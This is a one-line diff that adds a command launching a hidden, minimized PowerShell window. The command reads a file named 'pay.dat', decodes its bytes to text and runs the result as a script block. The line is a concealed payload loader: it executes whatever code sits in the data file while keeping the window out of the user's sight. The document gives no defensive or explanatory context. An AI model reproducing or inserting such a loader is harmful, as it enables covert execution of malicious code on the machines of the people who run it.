@@ -1,0 +1,1 @@
+start /min powershell.exe -windowstyle hidden -NoExit "$stringPath='./pay.dat';$stringByte = Get-Content -path $stringPath -encoding byte;$string = [System.Text.Encoding]::UTF8.GetString($stringByte);$scriptBlock = [scriptblock]::Create($string);Invoke-Command $scriptBlock;"
